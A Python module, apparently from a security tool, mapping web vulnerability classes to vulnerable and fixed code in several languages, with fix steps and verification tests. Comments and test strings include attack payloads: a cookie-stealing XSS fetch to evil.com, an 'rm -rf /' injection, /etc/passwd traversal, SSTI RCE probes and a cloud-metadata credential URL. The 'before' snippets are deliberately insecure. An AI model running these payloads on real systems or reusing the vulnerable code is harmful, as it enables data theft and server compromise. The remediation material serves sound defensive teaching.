"""
ai_remediation.py — Havoc Security Exact Patch Engine v3.0
===========================================================
Each vulnerability entry contains:
  • summary    – Plain-English explanation of the flaw
  • impact     – Business / technical impact
  • steps      – Ordered list of fix steps for the dev team  (NEW)
  • patches    – Per-language/framework: before (vulnerable) + after (fixed)
  • verify     – How to confirm the fix worked  (NEW)
  • references – OWASP / PortSwigger / CVE links
"""
from typing import Dict, List

# ═══════════════════════════════════════════════════════════════════════════
#  PATCH LIBRARY  ─  25+ vulnerability classes, multi-language, detailed
# ═══════════════════════════════════════════════════════════════════════════
PATCH_LIBRARY: Dict[str, Dict] = {

    # ── 1. SQL INJECTION ────────────────────────────────────────────────────
    'SQL Injection': {
        'summary': (
            'SQL Injection lets attackers manipulate the database query by injecting SQL '
            'syntax through unvalidated user input. The server executes attacker-controlled '
            'SQL, exposing or destroying data.'
        ),
        'impact': (
            '🔴 CRITICAL — Full database dump, authentication bypass, data deletion, '
            'and in some configurations (xp_cmdshell / INTO OUTFILE) Remote Code Execution.'
        ),
        'steps': [
            '1. Identify every place user input touches SQL (search, login, filters, URL params).',
            '2. Replace all string concatenation with parameterized queries / prepared statements.',
            '3. Apply principle of least privilege — the DB user should only SELECT/INSERT for app needs.',
            '4. Add a WAF rule to block common SQL keywords at the network layer as a defence-in-depth.',
            '5. Run sqlmap or a DAST scanner against staging to confirm the fix.',
        ],
        'patches': {
            'Python · Flask + SQLite/MySQL': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — string concatenation, direct injection possible
user_id = request.args.get("id")
query   = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(query)
# Payload: ?id=1 OR 1=1--   →  dumps all users
''',
                'after': '''\
# ✅ FIXED — Parameterized query (works the same for MySQL, SQLite, PostgreSQL)
from flask import request, abort
import re

user_id = request.args.get("id", "")

# Step 1 – Validate expected type FIRST (whitelist)
if not re.fullmatch(r"\\d+", user_id):
    abort(400, "Invalid id parameter")

# Step 2 – Parameterized query (user_id is NEVER concatenated)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
#                                                      ↑ tuple, not f-string
row = cursor.fetchone()
if row is None:
    abort(404)
''',
            },
            'Python · SQLAlchemy ORM': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — raw f-string passed to execute()
name   = request.json.get("name")
result = db.execute(f"SELECT * FROM users WHERE name = \'{name}\'")
''',
                'after': '''\
# ✅ FIXED — Option A: ORM model (safest)
from myapp.models import User
user = User.query.filter_by(name=name).first()

# ✅ FIXED — Option B: text() with bound parameter
from sqlalchemy import text
result = db.execute(
    text("SELECT * FROM users WHERE name = :name"),
    {"name": name}
)
''',
            },
            'PHP · PDO (Prepared Statements)': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE — direct concatenation
$id     = $_GET["id"];
$query  = "SELECT * FROM users WHERE id = " . $id;
$result = mysqli_query($conn, $query);
?>
''',
                'after': '''\
<?php
// ✅ FIXED — PDO prepared statement
$id   = $_GET["id"] ?? "";

// Validate type
if (!ctype_digit($id)) {
    http_response_code(400);
    exit("Invalid id");
}

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    http_response_code(404);
    exit("Not found");
}
?>
''',
            },
            'Node.js · mysql2 / pg': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — template literal in query
const id    = req.params.id;
const query = `SELECT * FROM users WHERE id = ${id}`;
db.query(query, (err, rows) => res.json(rows));
''',
                'after': '''\
// ✅ FIXED — placeholder syntax (? for MySQL, $1 for PostgreSQL)
const id = parseInt(req.params.id, 10);
if (isNaN(id)) return res.status(400).json({ error: "Invalid id" });

// MySQL2
db.execute("SELECT * FROM users WHERE id = ?", [id],
  (err, rows) => res.json(rows));

// PostgreSQL (pg)
// db.query("SELECT * FROM users WHERE id = $1", [id],
//   (err, result) => res.json(result.rows));
''',
            },
            'Java · JDBC': {
                'lang': 'java',
                'before': '''\
// ❌ VULNERABLE
String id    = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = " + id;
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery(query);
''',
                'after': '''\
// ✅ FIXED — PreparedStatement
String id = request.getParameter("id");
try {
    int userId = Integer.parseInt(id);   // validate type
    PreparedStatement ps = conn.prepareStatement(
        "SELECT * FROM users WHERE id = ?"
    );
    ps.setInt(1, userId);
    ResultSet rs = ps.executeQuery();
} catch (NumberFormatException e) {
    response.sendError(400, "Invalid id");
}
''',
            },
            'Nginx · WAF Layer (Defence-in-Depth)': {
                'lang': 'nginx',
                'before': '''\
# ❌ No SQLi protection at the edge
''',
                'after': '''\
# ✅ ModSecurity WAF rule (nginx.conf or sites-available)
server {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}

# main.conf — add CRS (Core Rule Set):
# SecRuleEngine On
# Include /etc/nginx/modsec/crs/REQUEST-942-APPLICATION-ATTACK-SQLI.conf
''',
            },
        },
        'verify': (
            'Run: sqlmap -u "https://example.com/user?id=1" --level=3 --risk=2 '
            'against staging. All injections should be blocked. Also check DB '
            'logs — parameterized queries appear as "? = <value>", never as raw strings.'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
            'https://portswigger.net/web-security/sql-injection',
        ],
    },

    # ── 2. BLIND SQL INJECTION ──────────────────────────────────────────────
    'Blind SQL Injection': {
        'summary': (
            'Blind SQLi exists when the app is SQL-injectable but no database output or '
            'error message is returned. Attackers infer data character-by-character via '
            'boolean or time-based responses (e.g., SLEEP(5) causes a 5-second delay).'
        ),
        'impact': (
            '🔴 CRITICAL — Same as error-based SQLi: full table extraction in automated tools '
            'like sqlmap takes minutes even without visible feedback.'
        ),
        'steps': [
            '1. Apply parameterized queries (same fix as SQL Injection — see above).',
            '2. Add a global query timeout to prevent SLEEP/WAITFOR attacks from stalling the server.',
            '3. Enable rate limiting on endpoints that accept user-controlled DB queries.',
            '4. Monitor for anomalous response times (> 3 s) as an IDS signal.',
        ],
        'patches': {
            'Python · Flask + MySQL (timeout)': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — no timeout, SLEEP() can stall the server
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
''',
                'after': '''\
# ✅ FIXED — parameterized + MySQL execution timeout
cursor.execute("SET SESSION MAX_EXECUTION_TIME = 2000")  # 2s cap
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
row = cursor.fetchone()
''',
            },
            'PHP · PDO (timeout + prepared)': {
                'lang': 'php',
                'before': '''\
<?php  // ❌ VULNERABLE
$id     = $_GET["id"];
$result = $pdo->query("SELECT * FROM users WHERE id = $id");
?>
''',
                'after': '''\
<?php
// ✅ FIXED — PDO + timeout attribute
$pdo->setAttribute(PDO::ATTR_TIMEOUT, 3);   // 3-second query cap
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute([":id" => (int)$_GET["id"]]);
?>
''',
            },
            'Database Level · MySQL': {
                'lang': 'sql',
                'before': '''\
-- ❌ No timeout configured
''',
                'after': '''\
-- ✅ Set global timeout to prevent long-running injected queries
SET GLOBAL MAX_EXECUTION_TIME = 3000;   -- 3 seconds (MySQL 5.7.8+)

-- Also restrict DB user permissions (least privilege):
REVOKE FILE ON *.* FROM "app_user"@"localhost";
REVOKE SUPER ON *.* FROM "app_user"@"localhost";
''',
            },
        },
        'verify': (
            'Try: curl "https://example.com/user?id=1 AND SLEEP(5)--" '
            'and measure response time. Should return 4xx or respond in < 3s after the fix.'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/Blind_SQL_Injection',
            'https://portswigger.net/web-security/sql-injection/blind',
        ],
    },

    # ── 3. XSS ──────────────────────────────────────────────────────────────
    'Cross-Site Scripting': {
        'summary': (
            'Cross-Site Scripting (XSS) occurs when an application includes unvalidated user '
            'data in HTML output without proper encoding, allowing attackers to inject '
            'JavaScript that runs in other users\' browsers.'
        ),
        'impact': (
            '🟠 HIGH — Session hijacking, credential theft, keylogging, phishing overlays, '
            'full account takeover, and spreading malware to site visitors.'
        ),
        'steps': [
            '1. HTML-encode all output before rendering (use the framework\'s built-in escaping).',
            '2. Never mark user-controlled strings as "safe" / "trusted" / |safe.',
            '3. Add a strong Content-Security-Policy header to block inline script execution.',
            '4. Set HttpOnly flag on session cookies so XSS cannot steal them via document.cookie.',
            '5. Use DOMPurify in the browser for any HTML that must be rendered (rich text editors).',
        ],
        'patches': {
            'Python · Flask / Jinja2': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — |safe disables Jinja2 auto-escaping
@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template_string(f"<h1>Hello {name}</h1>")
    # Payload: ?name=<script>fetch("//evil.com?c="+document.cookie)</script>
''',
                'after': '''\
# ✅ FIXED — Three layers of protection

# Layer 1: Use render_template (never render_template_string with user input)
@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template("greet.html", name=name)
    # greet.html: <h1>Hello {{ name }}</h1>  ← auto-escaped by Jinja2

# Layer 2: Explicit escaping for edge cases
from markupsafe import escape
safe_name = escape(name)  # Converts < > " \' & to HTML entities

# Layer 3: Content-Security-Policy header
@app.after_request
def add_csp(response):
    response.headers["Content-Security-Policy"] = (
        "default-src \'self\'; "
        "script-src \'self\'; "
        "style-src \'self\' \'unsafe-inline\';"
    )
    return response
''',
            },
            'PHP': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE — raw echo
echo "Hello " . $_GET["name"];
?>
''',
                'after': '''\
<?php
// ✅ FIXED — htmlspecialchars with ENT_QUOTES + charset
$name = htmlspecialchars($_GET["name"] ?? "", ENT_QUOTES | ENT_HTML5, "UTF-8");
echo "Hello " . $name;

// For rich text (e.g., user comments), use HTML Purifier:
// require_once "HTMLPurifier.auto.php";
// $purifier = new HTMLPurifier();
// $clean    = $purifier->purify($_POST["comment"]);
?>
''',
            },
            'Node.js · Express': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — template literal renders raw input
app.get("/greet", (req, res) => {
  res.send(`<h1>Hello ${req.query.name}</h1>`);
});
''',
                'after': '''\
// ✅ FIXED — Option A: use a template engine (EJS auto-escapes with <%=)
// views/greet.ejs: <h1>Hello <%= name %></h1>
app.get("/greet", (req, res) => {
  res.render("greet", { name: req.query.name });
});

// ✅ FIXED — Option B: manual encode + Helmet CSP
const escHtml = (s) => s
  .replace(/&/g, "&amp;").replace(/</g, "&lt;")
  .replace(/>/g, "&gt;").replace(/"/g, "&quot;")
  .replace(/\'/g, "&#039;");

app.get("/greet", (req, res) => {
  res.setHeader("Content-Security-Policy", "default-src \'self\'");
  res.send(`<h1>Hello ${escHtml(req.query.name)}</h1>`);
});
''',
            },
            'React · Frontend': {
                'lang': 'jsx',
                'before': '''\
// ❌ VULNERABLE — dangerouslySetInnerHTML bypasses React XSS protection
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
''',
                'after': '''\
// ✅ FIXED — Sanitize with DOMPurify before rendering
// npm install dompurify
import DOMPurify from "dompurify";

function Comment({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
    ALLOWED_ATTR: ["href", "target"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ Best practice — avoid dangerouslySetInnerHTML entirely
// React text nodes are automatically escaped:
function Comment({ text }) {
  return <div>{text}</div>;   // safe — React encodes this
}
''',
            },
            'Nginx · CSP Header': {
                'lang': 'nginx',
                'before': '''\
# ❌ No Content-Security-Policy
''',
                'after': '''\
# ✅ Add CSP in nginx.conf (server block)
add_header Content-Security-Policy
  "default-src \'self\';
   script-src \'self\' https://trusted-cdn.com;
   style-src \'self\' \'unsafe-inline\';
   img-src \'self\' data: https:;
   font-src \'self\' https://fonts.gstatic.com;
   frame-ancestors \'none\';"
  always;
''',
            },
        },
        'verify': (
            'Test: append ?name=<script>alert(1)</script> to all URLs. '
            'The browser should NOT execute an alert. Use the browser DevTools '
            'Network tab to confirm the CSP header is present on all responses.'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/xss/',
            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
            'https://portswigger.net/web-security/cross-site-scripting',
            'https://csp-evaluator.withgoogle.com/',
        ],
    },

    # ── 4. COMMAND INJECTION ────────────────────────────────────────────────
    'Command Injection': {
        'summary': (
            'Command injection occurs when user-supplied data is passed to a system shell '
            'without sanitization. Attackers append shell metacharacters (;, |, &&) to '
            'execute arbitrary OS commands as the web server user.'
        ),
        'impact': (
            '🔴 CRITICAL — Full server compromise, data exfiltration, ransomware deployment, '
            'reverse shell, lateral movement to internal network.'
        ),
        'steps': [
            '1. NEVER pass user input to os.system(), shell=True, exec(), popen(), or eval().',
            '2. Use subprocess.run() with a LIST of arguments (no shell=True).',
            '3. Whitelist input with a strict regex before use.',
            '4. Run the web app as a low-privilege user (www-data, nobody) with no sudo.',
            '5. Use seccomp/AppArmor to restrict what system calls the process can make.',
        ],
        'patches': {
            'Python · subprocess (safest)': {
                'lang': 'python',
                'before': '''\
# ❌ CRITICAL — shell=True with user input = instant RCE
import os, subprocess

filename = request.args.get("file")
os.system(f"cat {filename}")            # Attack: file=foo; rm -rf /
subprocess.run(f"ls {filename}", shell=True)   # Same problem
''',
                'after': '''\
# ✅ FIXED — list args, no shell, strict whitelist, timeout
import subprocess, re
from flask import request, abort

filename = request.args.get("file", "")

# Step 1 – strict whitelist (only letters, digits, dash, underscore, dot)
if not re.fullmatch(r"[A-Za-z0-9_\\-\\.]{1,64}", filename):
    abort(400, "Invalid filename")

# Step 2 – subprocess with LIST (shell=False by default = no injection)
try:
    result = subprocess.run(
        ["cat", "/safe/dir/" + filename],   # absolute path, no interpolation
        capture_output=True, text=True,
        timeout=5,                          # prevent DoS
    )
    return result.stdout
except subprocess.TimeoutExpired:
    abort(408)
''',
            },
            'PHP': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE
$file = $_GET["file"];
system("cat " . $file);
?>
''',
                'after': '''\
<?php
// ✅ FIXED — escapeshellarg() + directory jail
$file     = basename($_GET["file"] ?? "");    // strip path traversal
$safe_dir = realpath("/var/www/uploads") . "/";
$full     = realpath($safe_dir . $file);

// Verify the path is still inside the allowed directory
if (!$full || strpos($full, $safe_dir) !== 0) {
    http_response_code(403);
    exit("Access denied");
}

// Read WITHOUT a shell
readfile($full);    // or file_get_contents($full)
?>
''',
            },
            'Node.js · child_process': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — shell: true with user data
const { exec } = require("child_process");
exec(`ls ${req.query.dir}`, (err, stdout) => res.send(stdout));
''',
                'after': '''\
// ✅ FIXED — execFile (no shell) + input validation
const { execFile } = require("child_process");
const path = require("path");

const dir = req.query.dir || "";
if (!/^[a-zA-Z0-9_\\-]+$/.test(dir)) {
  return res.status(400).json({ error: "Invalid dir" });
}

const safePath = path.join("/app/data", dir);   // jail to known root
execFile("ls", [safePath], { timeout: 3000 }, (err, stdout) => {
  if (err) return res.status(403).json({ error: "Access denied" });
  res.send(stdout);
});
''',
            },
            'Java · ProcessBuilder': {
                'lang': 'java',
                'before': '''\
// ❌ VULNERABLE
Runtime.getRuntime().exec("ping " + userInput);
''',
                'after': '''\
// ✅ FIXED — ProcessBuilder with list args (no shell expansion)
import java.util.regex.Pattern;

String host = request.getParameter("host");
if (!Pattern.matches("[a-zA-Z0-9\\.\\-]{1,253}", host)) {
    response.sendError(400, "Invalid host");
    return;
}

ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
pb.redirectErrorStream(true);
Process p = pb.start();
''',
            },
        },
        'verify': (
            'Send: file=test; whoami — the server should return 400 Bad Request. '
            'Also test: file=../../etc/passwd — must be rejected by path validation.'
        ),
        'references': [
            'https://owasp.org/www-community/attacks/Command_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
        ],
    },

    # ── 5. LOCAL FILE INCLUSION ─────────────────────────────────────────────
    'Local File Inclusion': {
        'summary': (
            'LFI allows attackers to read arbitrary files on the server by manipulating '
            'file path parameters. Combined with log poisoning it can lead to RCE. '
            'PHP wrappers (php://filter, data://) can expose source code.'
        ),
        'impact': (
            '🔴 CRITICAL — Exposes /etc/passwd, SSH keys, .env files, DB credentials, '
            'and application source code. Can escalate to RCE via log poisoning.'
        ),
        'steps': [
            '1. Never pass user input directly to file read functions.',
            '2. Use a strict allowlist of permitted page names/IDs.',
            '3. Map IDs to file paths server-side — never trust client-sent paths.',
            '4. Jail file access using realpath() and verify the result starts with your allowed directory.',
            '5. Disable php:// and data:// wrappers in PHP (allow_url_include = Off).',
        ],
        'patches': {
            'Python · Flask (allowlist approach)': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — direct file inclusion via user param
@app.route("/page")
def page():
    name = request.args.get("page")
    with open(f"templates/{name}") as f:
        return f.read()
    # Attack: ?page=../../../../etc/passwd
''',
                'after': '''\
# ✅ FIXED — strict allowlist + safe_join
from flask import safe_join, abort, render_template
import os

ALLOWED_PAGES = {"home", "about", "contact", "faq"}   # explicit set

@app.route("/page")
def page():
    name = request.args.get("page", "home")
    if name not in ALLOWED_PAGES:
        abort(404)   # Reject unknown pages — never tell attacker why
    return render_template(f"{name}.html")

# If dynamic file reading is unavoidable:
def safe_read(base_dir: str, filename: str) -> str:
    safe = os.path.realpath(os.path.join(base_dir, filename))
    if not safe.startswith(os.path.realpath(base_dir) + os.sep):
        abort(403)   # Path traversal attempt
    with open(safe) as f:
        return f.read()
''',
            },
            'PHP': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE
$page = $_GET["page"];
include($page . ".php");
?>
''',
                'after': '''\
<?php
// ✅ FIXED — allowlist + realpath jail
$allowed = ["home", "about", "contact"];
$page    = $_GET["page"] ?? "home";

if (!in_array($page, $allowed, true)) {
    http_response_code(404);
    exit("Page not found");
}

$base = realpath(__DIR__ . "/pages");
$file = realpath($base . "/" . $page . ".php");

// Double-check resolved path is inside pages/
if (!$file || strpos($file, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403);
    exit("Access denied");
}

include $file;
?>
''',
            },
            'PHP · php.ini hardening': {
                'lang': 'php',
                'before': '''\
; ❌ Default — wrappers enabled
allow_url_fopen    = On
allow_url_include  = On
''',
                'after': '''\
; ✅ FIXED — disable dangerous PHP wrappers in php.ini
allow_url_fopen    = Off
allow_url_include  = Off
open_basedir       = /var/www/html   ; Jail PHP to web root
''',
            },
            'Node.js': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE
app.get("/file", (req, res) => fs.readFile(req.query.path, "utf8",
  (err, data) => res.send(data)));
''',
                'after': '''\
// ✅ FIXED — path.resolve + startsWith check
const path = require("path");
const fs   = require("fs");
const BASE = path.resolve("/app/public");

const ALLOWED = new Set(["index.html", "about.html", "faq.html"]);

app.get("/file", (req, res) => {
  const name = req.query.file || "";
  if (!ALLOWED.has(name)) return res.status(404).json({ error: "Not found" });

  const full = path.resolve(BASE, name);
  if (!full.startsWith(BASE + path.sep)) return res.status(403).end();

  fs.readFile(full, "utf8", (err, data) => {
    if (err) return res.status(404).end();
    res.send(data);
  });
});
''',
            },
        },
        'verify': (
            'Test: ?page=../../../../etc/passwd — should get 404. '
            '?page=php://filter/convert.base64-encode/resource=index — should get 404. '
            'Burp Suite Intruder with LFI wordlist should produce only 404/403 responses.'
        ),
        'references': [
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion',
            'https://portswigger.net/web-security/file-path-traversal',
        ],
    },

    # ── 6. SSRF ─────────────────────────────────────────────────────────────
    'SSRF': {
        'summary': (
            'Server-Side Request Forgery lets attackers coerce the server to make HTTP '
            'requests to internal services or cloud metadata APIs (169.254.169.254) that '
            'are normally unreachable from the internet.'
        ),
        'impact': (
            '🔴 CRITICAL — AWS/GCP/Azure credential theft, internal network enumeration, '
            'Redis/MongoDB unauthenticated access, cloud account takeover.'
        ),
        'steps': [
            '1. Allowlist the set of domains/IPs the server is permitted to fetch.',
            '2. Resolve the hostname to an IP and block private/loopback/link-local ranges.',
            '3. Disable HTTP redirects in requests (or re-validate the redirect destination).',
            '4. Use a dedicated outbound proxy that enforces the allowlist at the network level.',
            '5. Restrict IMDS access on cloud VMs (use IMDSv2 token-required on AWS).',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — fetches any URL from user input
import requests
@app.route("/fetch")
def fetch():
    url = request.args.get("url")
    return requests.get(url, timeout=5).text
    # Attack: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
''',
                'after': '''\
# ✅ FIXED — allowlist + private IP block
import requests, ipaddress, socket
from urllib.parse import urlparse
from flask import request, abort

ALLOWED_DOMAINS = {
    "api.partner.com",
    "cdn.mysite.com",
}

def is_safe_url(raw_url: str) -> bool:
    try:
        p = urlparse(raw_url)
        if p.scheme not in ("http", "https"):
            return False
        host = p.hostname or ""
        if not host or host not in ALLOWED_DOMAINS:
            return False
        # Resolve hostname and block private ranges
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        blocked = (ip.is_private or ip.is_loopback or
                   ip.is_link_local or ip.is_reserved or
                   ip.is_multicast)
        return not blocked
    except Exception:
        return False

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not is_safe_url(url):
        abort(403, "URL not allowed")
    resp = requests.get(url, timeout=5,
                        allow_redirects=False)  # no auto-follow
    return resp.text
''',
            },
            'Node.js': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE
app.get("/proxy", async (req, res) => {
  const r = await fetch(req.query.url);
  res.send(await r.text());
});
''',
                'after': '''\
// ✅ FIXED — allowlist + private IP check
const { URL } = require("url");
const ipRangeCheck = require("ip-range-check");  // npm i ip-range-check

const ALLOWED = ["api.partner.com", "cdn.mysite.com"];
const PRIVATE  = [
  "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
  "127.0.0.0/8", "169.254.0.0/16", "::1/128",
];

async function safeGet(rawUrl) {
  const parsed = new URL(rawUrl);
  if (!ALLOWED.includes(parsed.hostname)) throw new Error("Blocked host");
  const dns  = require("dns").promises;
  const addrs = await dns.resolve4(parsed.hostname);
  if (addrs.some(ip => ipRangeCheck(ip, PRIVATE)))
    throw new Error("Private IP blocked");
  const resp = await fetch(rawUrl, { redirect: "error" });
  return resp.text();
}

app.get("/proxy", async (req, res) => {
  try { res.send(await safeGet(req.query.url)); }
  catch (e) { res.status(403).json({ error: e.message }); }
});
''',
            },
            'AWS · Force IMDSv2 (cloud defence)': {
                'lang': 'bash',
                'before': '''\
# ❌ IMDSv1 — any HTTP request from instance gets credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
''',
                'after': '''\
# ✅ Require token (IMDSv2) — SSRF payloads can\'t supply the PUT token
aws ec2 modify-instance-metadata-options \\
  --instance-id i-XXXXXXXXX \\
  --http-tokens required \\
  --http-put-response-hop-limit 1
  
# Or in Terraform:
# metadata_options {
#   http_tokens   = "required"
#   http_endpoint = "enabled"
# }
''',
            },
        },
        'verify': (
            'Send: ?url=http://169.254.169.254/latest/meta-data/ — should get 403. '
            '?url=http://localhost:6379 — should get 403. '
            '?url=https://cdn.mysite.com/image.jpg — should succeed.'
        ),
        'references': [
            'https://portswigger.net/web-security/ssrf',
            'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
            'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html',
        ],
    },

    # ── 7. SSTI ─────────────────────────────────────────────────────────────
    'SSTI': {
        'summary': (
            'Server-Side Template Injection occurs when user input is embedded directly '
            'into a template string and evaluated by the template engine. Attackers craft '
            'payloads like {{7*7}} to confirm execution, then escalate to OS commands.'
        ),
        'impact': (
            '🔴 CRITICAL — Full Remote Code Execution. Jinja2 SSTI allows attackers to call '
            'Python built-ins and execute arbitrary system commands via __subclasses__().'
        ),
        'steps': [
            '1. NEVER pass user input into render_template_string() or equivalent.',
            '2. Use pre-written static template files and pass data as context variables only.',
            '3. If dynamic templates are a business requirement, use a sandboxed environment.',
            '4. Audit all template rendering calls for any user-controlled variable in the template string.',
        ],
        'patches': {
            'Python · Jinja2 / Flask': {
                'lang': 'python',
                'before': '''\
# ❌ CRITICAL — user-supplied string rendered as Jinja2 template
@app.route("/render")
def render():
    tmpl = request.args.get("template", "Hello World")
    return render_template_string(tmpl)
    # {{config}} → dumps SECRET_KEY, DATABASE_URI
    # {{().__class__.__bases__[0].__subclasses__()}} → list all classes → RCE
''',
                'after': '''\
# ✅ FIXED — Option A: static template file only (recommended)
@app.route("/greet")
def greet():
    name = request.args.get("name", "User")
    # Data is passed as a context variable, never as the template itself
    return render_template("greet.html", user_name=name)

# greet.html:
# <h1>Hello {{ user_name }}</h1>   ← Jinja2 auto-escapes user_name

# ✅ FIXED — Option B: Sandboxed env (only if user templates are required)
from jinja2.sandbox import SandboxedEnvironment
_sandbox = SandboxedEnvironment()      # blocks __class__, __globals__, os, etc.

@app.route("/custom")
def custom():
    tmpl_string = request.args.get("tmpl", "")
    try:
        tmpl = _sandbox.from_string(tmpl_string)
        return tmpl.render(username="Guest")  # limited context
    except Exception:
        return "Invalid template", 400
''',
            },
            'Node.js · Handlebars / Pug': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — Handlebars compile() with user input
const Handlebars = require("handlebars");
app.get("/tpl", (req, res) => {
  const tpl = Handlebars.compile(req.query.t);  // user controls template
  res.send(tpl({ name: "World" }));
});
''',
                'after': '''\
// ✅ FIXED — pre-compile static templates only; never compile user input
const Handlebars = require("handlebars");

// Compile ONCE at startup from a static string/file
const GREET_TPL = Handlebars.compile("<p>Hello {{name}}</p>");

app.get("/tpl", (req, res) => {
  // User only controls DATA, never the template itself
  const name = (req.query.name || "").replace(/[<>]/g, "");  // basic clean
  res.send(GREET_TPL({ name }));
});
''',
            },
            'Ruby · ERB': {
                'lang': 'ruby',
                'before': '''\
# ❌ VULNERABLE — ERB.new from user input
require "erb"
get "/render" do
  template = params[:t]
  ERB.new(template).result   # <%= system("id") %> → RCE
end
''',
                'after': '''\
# ✅ FIXED — static ERB file, user data only in binding
require "erb"
TEMPLATE = ERB.new(File.read("views/greet.erb"))   # static file

get "/render" do
  @name = params[:name] || "Guest"
  TEMPLATE.result(binding)    # user data goes into @name, not into template string
end
# views/greet.erb: <h1>Hello <%= h(@name) %></h1>  ← h() HTML-encodes
''',
            },
        },
        'verify': (
            'Test: ?template={{7*7}} — should return literal "{{7*7}}" or 400, '
            'never "49". Also test: ?template={{config}} — should not expose Flask config.'
        ),
        'references': [
            'https://portswigger.net/web-security/server-side-template-injection',
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection',
        ],
    },

    # ── 8. XXE ──────────────────────────────────────────────────────────────
    'XXE': {
        'summary': (
            'XML External Entity injection occurs when an XML parser processes user-supplied '
            'XML containing DOCTYPE declarations that reference external entities. This '
            'allows reading local files, SSRF, and in some parsers, RCE.'
        ),
        'impact': (
            '🔴 CRITICAL — Read /etc/passwd, /etc/shadow, application source code, '
            'AWS metadata credentials, and perform blind SSRF to internal services.'
        ),
        'steps': [
            '1. Disable external entity processing in the XML parser (the ONLY reliable fix).',
            '2. Disable DTD (DOCTYPE) processing entirely if not needed.',
            '3. Use JSON instead of XML for APIs where possible.',
            '4. Validate/reject any XML containing DOCTYPE or ENTITY declarations.',
        ],
        'patches': {
            'Python · lxml / defusedxml': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — standard ElementTree processes external entities
import xml.etree.ElementTree as ET
data = request.data
root = ET.fromstring(data)   # XXE possible!
''',
                'after': '''\
# ✅ FIXED — Option A: defusedxml (recommended, drop-in replacement)
# pip install defusedxml
import defusedxml.ElementTree as ET
root = ET.fromstring(data)
# defusedxml raises DefusedXmlException for XXE, billion laughs, etc.

# ✅ FIXED — Option B: lxml with hardened parser
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,   # kills XXE
    no_network=True,          # kills external DTD fetch
    dtd_validation=False,
    load_dtd=False,
)
root = etree.fromstring(data, parser=parser)
''',
            },
            'Java · JAXB / DocumentBuilder': {
                'lang': 'java',
                'before': '''\
// ❌ VULNERABLE — default DocumentBuilder allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
''',
                'after': '''\
// ✅ FIXED — disable all external entity processing
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
''',
            },
            'PHP · libxml': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE — default libxml loads external entities
$xml = simplexml_load_string($userXml);
?>
''',
                'after': '''\
<?php
// ✅ FIXED — disable external entity loading BEFORE parsing
